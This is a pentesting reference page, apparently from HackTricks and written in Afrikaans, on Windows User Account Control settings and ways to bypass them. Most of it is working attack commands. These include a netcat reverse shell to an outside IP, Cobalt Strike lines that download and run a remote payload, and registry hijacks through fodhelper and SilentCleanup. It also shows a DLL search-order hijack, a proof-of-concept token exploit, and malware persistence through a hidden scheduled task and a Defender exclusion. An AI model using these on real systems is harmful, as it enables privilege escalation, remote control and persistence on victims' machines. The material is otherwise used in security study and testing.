# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is 'n kenmerk wat 'n **toestemmingsaanvraag vir verhoogde aktiwiteite** aktiveer. Toepassings het verskillende `integrity`-vlakke, en 'n program met 'n **hoë vlak** kan take uitvoer wat die **stelsel moontlik kan kompromitteer**. Wanneer UAC geaktiveer is, **loop toepassings en take altyd onder die sekuriteitskonteks van 'n nie-administrateurrekening** tensy 'n administrateur hierdie toepassings/take uitdruklik magtig om administrateurvlaktoegang tot die stelsel te hê om uit te voer. Dit is 'n geriefskenmerk wat administrateurs teen onbedoelde veranderinge beskerm, maar dit word nie as 'n sekuriteitsgrens beskou nie.

Vir meer inligting oor integriteitsvlakke:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Wanneer UAC in plek is, word 'n administrateurgebruiker 2 tokens gegee: 'n standaardgebruikertoken om gewone handelinge met medium integrity uit te voer, en een met die administrateurvoorregte.

Hierdie [bladsy](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) bespreek in groot diepte hoe UAC werk en sluit die aanmeldingsproses, gebruikerservaring en UAC-argitektuur in. Administrateurs kan sekuriteitsbeleide gebruik om te konfigureer hoe UAC spesifiek vir hul organisasie op plaaslike vlak werk (met secpol.msc), of dit in 'n Active Directory-domeinomgewing deur Group Policy Objects (GPO) te konfigureer en uit te stoot. Die verskillende instellings word [hier](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) in detail bespreek. Daar is 10 Group Policy-instellings wat vir UAC gestel kan word. Die volgende tabel verskaf bykomende besonderhede:

| Group Policy-instelling                                                                                                                                                                                                                                                                                                                                                           | Registry-sleutel                | Standaardinstelling                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Gedeaktiveer)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Vra vir toestemming vir nie-Windows-binaries op die veilige lessenaar) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Vra vir geloofsbriewe op die veilige lessenaar)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Geaktiveer; by verstek gedeaktiveer op Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Gedeaktiveer)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Geaktiveer)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Geaktiveer)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Gedeaktiveer)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Geaktiveer)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Geaktiveer)                                              |

### Beleide vir die installering van sagteware op Windows

Die **plaaslike sekuriteitsbeleide** ("secpol.msc" op die meeste stelsels) is by verstek gekonfigureer om **te voorkom dat nie-admingebruikers sagteware-installasies uitvoer**. Dit beteken dat selfs al kan 'n nie-admingebruiker die installer vir jou sagteware aflaai, hulle dit nie sonder 'n adminrekening sal kan uitvoer nie.

### Registry-sleutels om UAC te dwing om vir verhoging te vra

As 'n standaardgebruiker sonder adminregte kan jy seker maak dat die "standaard"-rekening **deur UAC vir geloofsbriewe gevra word** wanneer dit probeer om sekere handelinge uit te voer. Hierdie handeling sal vereis dat sekere **registry-sleutels** gewysig word, waarvoor jy adminvoorregte benodig, tensy daar 'n **UAC bypass** is, of die aanvaller reeds as admin aangemeld is.

Selfs al is die gebruiker in die **Administrators**-groep, dwing hierdie veranderinge die gebruiker om hul **rekeninggeloofsbriewe weer in te voer** om administratiewe handelinge uit te voer.

**In die praktyk is dit slegs nuttig wanneer jy reeds 'n verhoogde token, 'n UAC bypass of 'n verkeerde konfigurasie het wat jou toelaat om hierdie sleutels te verander; andersins word die registry-skrywing self geblokkeer.**

Die registry-sleutels en inskrywings wat jy moet verander, is die volgende (met hul verstekwaardes tussen hakies):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Dit kan ook handmatig deur die Local Security Policy-instrument gedoen word. Sodra dit verander is, vra administratiewe bewerkings die gebruiker om hul geloofsbriewe weer in te voer.

### Nota

**User Account Control is nie 'n sekuriteitsgrens nie.** Daarom kan standaardgebruikers nie uit hul rekeninge breek en administrateurregte verkry sonder 'n plaaslike privilege escalation-exploit nie.

### Vra 'n gebruiker vir 'volle rekenaartoegang'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC-regte

- Internet Explorer Protected Mode gebruik integriteitskontroles om te voorkom dat prosesse met 'n hoë integriteitsvlak (soos webblaaiers) toegang verkry tot data met 'n lae integriteitsvlak (soos die vouer met tydelike Internet-lêers). Dit word gedoen deur die blaaier met 'n lae-integriteit-token te laat loop. Wanneer die blaaier probeer om toegang te verkry tot data wat in die lae-integriteitsone gestoor is, kontroleer die bedryfstelsel die integriteitsvlak van die proses en laat toegang dienooreenkomstig toe. Hierdie funksie help om te voorkom dat remote code execution-aanvalle toegang tot sensitiewe data op die stelsel verkry.
- Wanneer 'n gebruiker by Windows aanmeld, skep die stelsel 'n toegang-token wat 'n lys van die gebruiker se voorregte bevat. Voorregte word gedefinieer as die kombinasie van 'n gebruiker se regte en vermoëns. Die token bevat ook 'n lys van die gebruiker se credentials, wat credentials is wat gebruik word om die gebruiker teenoor die rekenaar en hulpbronne op die netwerk te authenticate.

### Autoadminlogon

Om Windows op te stel om outomaties tydens opstart by 'n spesifieke gebruiker aan te meld, stel die **`AutoAdminLogon` registry key** in. Dit is nuttig vir kiosk-omgewings of vir toetsdoeleindes. Gebruik dit slegs op veilige stelsels, aangesien dit die wagwoord in die registry blootstel.

Stel die volgende keys met die Registry Editor of `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Om na normale aanmeldgedrag terug te keer, stel `AutoAdminLogon` op 0.

## UAC bypass

> [!TIP]
> Let daarop dat UAC bypass eenvoudig is as jy graphical access tot die slagoffer het, aangesien jy eenvoudig op "Yes" kan klik wanneer die UAC-prompt verskyn

Die UAC bypass is in die volgende situasie nodig: **UAC is geaktiveer, jou proses loop in 'n medium-integrity context, en jou gebruiker behoort aan die administrators group**.

Dit is belangrik om te noem dat dit **baie moeiliker is om UAC te bypass as dit op die hoogste security level (Always) is as wanneer dit op enige van die ander levels (Default) is.**

### Fast triage from a medium-integrity shell

Voordat jy 'n bypass probeer, bevestig dat jy in die regte scenario is en karteer die host build teenoor bekende werkende metodes:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Praktiese notas:
- As `EnableLUA=0` is, het jy nie ’n bypass nodig nie: enige admin-token kan hoë integriteit direk aanvra.
- `ConsentPromptBehaviorAdmin=2` of `5` is die algemene scenario vir auto-elevate / COM-based bypasses.
- `Always Notify` verhoog die drempel, maar jy moet steeds die presiese build toets eerder as om mislukking te aanvaar: UACME volg steeds sommige `AlwaysNotify compatible`-metodes op moderne Windows-builds.

### UAC gedeaktiveer

As UAC reeds gedeaktiveer is (`ConsentPromptBehaviorAdmin` is **`0`**), kan jy ’n reverse shell met admin-voorregte (hoë integriteitsvlak) uitvoer deur iets soos die volgende te gebruik:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass met token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Baie** Basiese UAC-"bypass" (volledige lêerstelseltoegang)

As jy 'n shell het met 'n gebruiker wat binne die Administrators-groep is, kan jy die **C$**-share via SMB (lêerstelsel) plaaslik op 'n nuwe skyf mount, en jy sal **toegang tot alles binne die lêerstelsel** hê (selfs die Administrator-tuisgids).

> [!WARNING]
> **Dit lyk asof hierdie truuk nie meer werk nie**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Die Cobalt Strike-tegnieke sal slegs werk as UAC nie op die maksimum sekuriteitsvlak gestel is nie
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** en **Metasploit** het ook verskeie modules om die **UAC** te **bypass**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM-objekte bly 'n praktiese UAC-oppervlak op moderne builds. `ICMLuaUtil` word steeds deur UACME as werkend op huidige Windows-vertakkings nagespoor, en offensive tooling hou aan om `CMSTPLUA` aan te pas deur 'n interaktiewe desktop-proses, 64-bit-uitvoering en soms PEB/proses-masquerading te kombineer voordat die COM Elevation Moniker aangeroep word.

Praktiese wenke:
- Verkies 'n **64-bit**-proses in die gebruiker se **interaktiewe sessie** (gewoonlik `explorer.exe` of 'n child daarvan).
- As 'n raw shell misluk, probeer weer vanuit 'n BOF / UACME-implementering eerder as 'n naive `CreateProcess`-wrapper.
- Verwag dat child execution in 'n **afsonderlike elevated proses** sal plaasvind; baie BOFs elevate nie die huidige beacon in-place nie.

### KRBUACBypass

Dokumentasie en tool by [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME), wat 'n **samestelling** van verskeie UAC bypass exploits is. Let daarop dat jy UACME met visual studio of msbuild sal moet **kompileer**. Die compilation sal verskeie uitvoerbare lêers skep (soos `Source\Akagi\outout\x64\Debug\Akagi.exe`); jy sal moet weet **watter een jy nodig het.**\
Jy moet **versigtig wees**, want sommige bypasses sal **ander programme prompt** wat die **gebruiker** sal **waarsku** dat iets aan die gebeur is.

UACME het die **build-weergawe waarvandaan elke tegniek begin werk het**. Jy kan soek na 'n tegniek wat jou weergawes beïnvloed:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Ook, deur [hierdie](https://en.wikipedia.org/wiki/Windows_10_version_history)-bladsy te gebruik, kry jy die Windows-vrystelling `1607` uit die build-weergawes.

’n Praktiese werksvloei is om eers die **host build te assesseer** en dan eers die ooreenstemmende metode uit te voer:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` vergelyk die plaaslike build vinnig met sy bekende UAC-metodes, wat nuttig is om dooie PoCs vinnig uit te skakel.
- `UACME` bly die beste publieke katalogus om 'n bypass aan 'n presiese build te koppel. Onlangse releases het nuwe metodes bygevoeg en bestaande metodes weer teen **Windows 11 25H2** getoets, dus moet die README/release notes weer nagegaan word voordat aanvaar word dat 'n ou blogplasing steeds onveranderd van toepassing is.

### UAC Bypass – fodhelper.exe (Registry hijack)

Die trusted binary `fodhelper.exe` word outomaties op moderne Windows geëlevate. Wanneer dit geloods word, bevraagteken dit die per-user registry path hieronder sonder om die `DelegateExecute`-verb te valideer. Deur 'n command daar te plant, kan 'n Medium Integrity-proses (user is in Administrators) 'n High Integrity-proses sonder 'n UAC-prompt spawn.

Registry path queried by fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>PowerShell-stappe (stel jou payload in, aktiveer dit dan)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Notas:
- Werk wanneer die huidige gebruiker 'n lid van Administrators is en die UAC-vlak verstek/verdraagsaam is (nie Always Notify met ekstra beperkings nie).
- Gebruik die `sysnative`-pad om 'n 64-bis PowerShell vanaf 'n 32-bis proses op 64-bis Windows te begin.
- Payload kan enige opdrag wees (PowerShell, cmd of 'n EXE-pad). Vermy UI's wat versoeke wys vir stealth.

#### CurVer/extension hijack-variant (slegs HKCU)

Onlangse voorbeelde wat `fodhelper.exe` misbruik, vermy `DelegateExecute` en herlei eerder die `ms-settings` ProgID via die per-user `CurVer`-waarde. Die auto-elevated binary soek steeds die handler onder `HKCU`, dus is geen admin-token nodig om die sleutels te plant nie:
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Sodra dit verhoogde voorregte het, **deaktiveer malware gewoonlik toekomstige prompts** deur `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` op `0` te stel, waarna dit addisionele defense evasion uitvoer (bv. `Add-MpPreference -ExclusionPath C:\ProgramData`) en persistence herskep om as high integrity te loop. ’n Tipiese persistence-taak stoor ’n **XOR-encrypted PowerShell-script** op skyf en decodeer/voer dit elke uur in-memory uit:
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Hierdie variant ruim steeds die dropper op en laat slegs die staged payloads agter, wat beteken dat detection moet steun op monitoring van die **`CurVer` hijack**, manipulering van `ConsentPromptBehaviorAdmin`, skepping van Defender exclusions, of scheduled tasks wat PowerShell in-memory decrypt.

### UAC bypass via `SilentCleanup` task (`HKCU\Environment\windir`)

`SilentCleanup` launches `cleanmgr.exe` met die hoogste privileges en brei `%windir%` uit die user environment uit. As jy beheer oor `HKCU\Environment\windir` het, kan jy daardie uitbreiding na ’n arbitrêre command redirect en high integrity sonder ’n consent dialog verkry. Hierdie metode is steeds die moeite werd om op onlangse builds te toets, omdat UACME die technique aktief hou en onlangse issue tracking toon dat Windows 11 24H2 moontlik slegs klein quoting-aanpassings vereis.
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
As die taak die pad op daardie build tussen aanhalingstekens plaas, probeer weer met die payload wat op ’n aanhalingsteken eindig (byvoorbeeld `cmd.exe"`). Maak altyd `HKCU\Environment\windir` skoon nadat jy getoets het.

#### Meer UAC bypass

Baie klassieke UAC bypasses wat UI-vloeie, COM objects of desktop interaction misbruik, vereis ’n **volledige interactive session** met die slagoffer; ’n algemene `nc.exe` shell of ’n service wat in **Session 0** loop, is dikwels nie genoeg nie.

Jy kan dit dikwels oplos deur ’n **meterpreter** session te gebruik. Migreer na ’n **process** waarvan die **Session**-waarde gelyk is aan **1**:

![Wys ms-settings na ’n custom extension (.thm) en map daardie extension na ons payload - Meer UAC bypass: Jy kan dit met ’n meterpreter session doen. Migreer na ’n process waarvan die Session...](<../../images/image (863).png>)

(_explorer.exe_ behoort te werk)

### UAC Bypass met GUI

As jy toegang tot ’n **GUI** het, kan jy eenvoudig die UAC-prompt **aanvaar** wanneer dit verskyn; jy het nie werklik ’n technical bypass nodig nie. Daarom is die verkryging van ’n GUI session dikwels genoeg om die praktiese wrywing wat deur UAC veroorsaak word, te omseil.

Boonop, as jy ’n GUI session kry wat iemand gebruik het (moontlik via RDP), sal daar **sommige tools wees wat as administrator loop**, waarvandaan jy byvoorbeeld ’n **cmd** direk **as admin kan run** sonder om weer deur UAC gevra te word, soos [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Dit kan ’n bietjie meer **stealthy** wees.

### Noisy brute-force UAC bypass

As jy nie omgee om noisy te wees nie, kan jy altyd **iets soos** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) **run** wat aanhou om permissions te **elevate** totdat die user dit aanvaar.

### Jou eie bypass - Basiese UAC bypass-metodologie

As jy na **UACME** kyk, sal jy opmerk dat **baie UAC bypasses DLL hijacking misbruik** (dikwels deur ’n elevated binary ’n attacker-controlled DLL vanaf ’n writable path te laat laai). [Lees dit om te leer hoe om ’n DLL hijacking-vulnerability te vind](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Vind ’n binary wat sal **autoelevate** (kontroleer dat dit op ’n high integrity level loop wanneer dit executed word).
2. Gebruik procmon om "**NAME NOT FOUND**"-events te vind wat kwesbaar vir **DLL Hijacking** kan wees.
3. Jy sal waarskynlik die DLL binne sommige **protected paths** moet **write** (soos C:\Windows\System32), waar jy nie writing permissions het nie. Jy kan dit omseil deur:
1. **wusa.exe**: Windows 7,8 en 8.1. Dit laat jou toe om die inhoud van ’n CAB-file binne protected paths te extract (omdat hierdie tool vanaf ’n high integrity level executed word).
2. **IFileOperation**: Windows 10.
4. Berei ’n **script** voor om jou DLL na die protected path te copy en die kwesbare en autoelevated binary te execute.

### Nog ’n UAC bypass-tegniek

Dit behels dat jy kyk of ’n **autoElevated binary** probeer om vanaf die **registry** die **name/path** van ’n **binary** of **command** te **read** wat **executed** moet word (dit is interessanter as die binary hierdie information binne die **HKCU** soek).

### UAC bypass via `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

Die 32-bit `C:\Windows\SysWOW64\iscsicpl.exe` is ’n **auto-elevated** binary wat misbruik kan word om `iscsiexe.dll` volgens die search order te laai. As jy ’n malicious `iscsiexe.dll` binne ’n **user-writable** folder kan plaas en dan die huidige user se `PATH` wysig (byvoorbeeld via `HKCU\Environment\Path`) sodat daardie folder searched word, kan Windows die attacker DLL binne die elevated `iscsicpl.exe`-process laai **sonder om ’n UAC-prompt te wys**.

Praktiese notas:
- Dit is nuttig wanneer die huidige user in **Administrators** is, maar op **Medium Integrity** loop weens UAC.
- Die **SysWOW64**-copy is die relevante een vir hierdie bypass. Behandel die **System32**-copy as ’n aparte binary en valideer die gedrag independently.
- Die primitive is ’n kombinasie van **auto-elevation** en **DLL search-order hijacking**, dus is dieselfde ProcMon-workflow wat vir ander UAC bypasses gebruik word nuttig om die ontbrekende DLL-load te valideer.

Minimale vloei:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Opsporingsidees:
- Stel ’n waarskuwing in vir `reg add` / registerskrywe na `HKCU\Environment\Path` wat onmiddellik gevolg word deur die uitvoering van `C:\Windows\SysWOW64\iscsicpl.exe`.
- Soek vir `iscsiexe.dll` in **gebruiker-beheerde** liggings soos `%TEMP%` of `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Korrelleer die bekendstelling van `iscsicpl.exe` met onverwagte kinderprosesse of DLL-laaie vanuit buite die normale Windows-gidse.

### Nuwer navorsing wat afsonderlik nagegaan behoort te word

Sommige kettings ná 2024 lyk nie meer soos die klassieke `HKCU\Software\Classes`-registerkapings nie. Aktiveringkontekskas-besoedeling kan byvoorbeeld ’n **dryfherkoppeling** en **DLL-herleiding** kombineer om van medium na hoë integriteit te beweeg deur vertroude UI / outomaties-verhewe binaries soos `ctfmon.exe` en latere teikens soos `fodhelper.exe`. In plaas daarvan om die groot PoC hier te dupliseer, raadpleeg die bondige payload-voorbeelde in:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (25H2)-dryfletterkaping via DOS-toestelkaart per aanmeldingsessie

Vir die volledige `RAiLaunchAdminProcess` / UIAccess-aanvalsoppervlak op Windows 11 25H2, raadpleeg die toegewyde bladsy:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 se “Administrator Protection” gebruik shadow-admin-tokens met per-sessie `\Sessions\0\DosDevices/<LUID>`-kaarte. Die gids word lui deur `SeGetTokenDeviceMap` geskep tydens die eerste `\??`-resolusie. As die aanvaller die shadow-admin-token slegs op **SecurityIdentification** naboots, word die gids geskep met die aanvaller as **eienaar** (dit erf `CREATOR OWNER`), wat dryfletter-skakels moontlik maak wat voorkeur bo `\GLOBAL??` geniet.

**Stappe:**

1. Roep vanuit ’n sessie met lae voorregte `RAiProcessRunOnce` aan om ’n promptlose shadow-admin `runonce.exe` voort te bring.
2. Dupliseer sy primêre token na ’n **identification**-token en boots dit na terwyl `\??` oopgemaak word om die skepping van `\Sessions\0\DosDevices/<LUID>` onder aanvallereienaarskap af te dwing.
3. Skep ’n `C:`-simboliese skakel daarheen wat na aanvaller-beheerde berging wys; daaropvolgende lêerstelseltoegange in daardie sessie los `C:` na die aanvallerpad op, wat DLL-/lêerkaping sonder ’n prompt moontlik maak.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
## Verwysings
- [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [Microsoft Docs – Hoe User Account Control werk](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – Versameling UAC bypass-tegnieke](https://github.com/hfiref0x/UACME)
- [WinPwnage – UAC bypass-versoenbaarheidsskandeerder en launcher](https://github.com/rootm0s/WinPwnage)
- [Checkpoint Research – KONNI gebruik AI om PowerShell-backdoors te genereer](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [Check Point Research – Operation TrueChaos: 0-Day-exploitasie teen Suidoos-Asiatiese regeringsteikens](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [Project Zero – Omseiling van Windows Administrator Protection](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [Project Zero – Omseiling van Administrator Protection deur UI Access te misbruik](https://projectzero.google/2026/02/windows-administrator-protection.html)
- [Sigma / Detection.FYI – Bypass UAC deur die SilentCleanup-taak te gebruik](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)

{{#include ../../banners/hacktricks-training.md}}
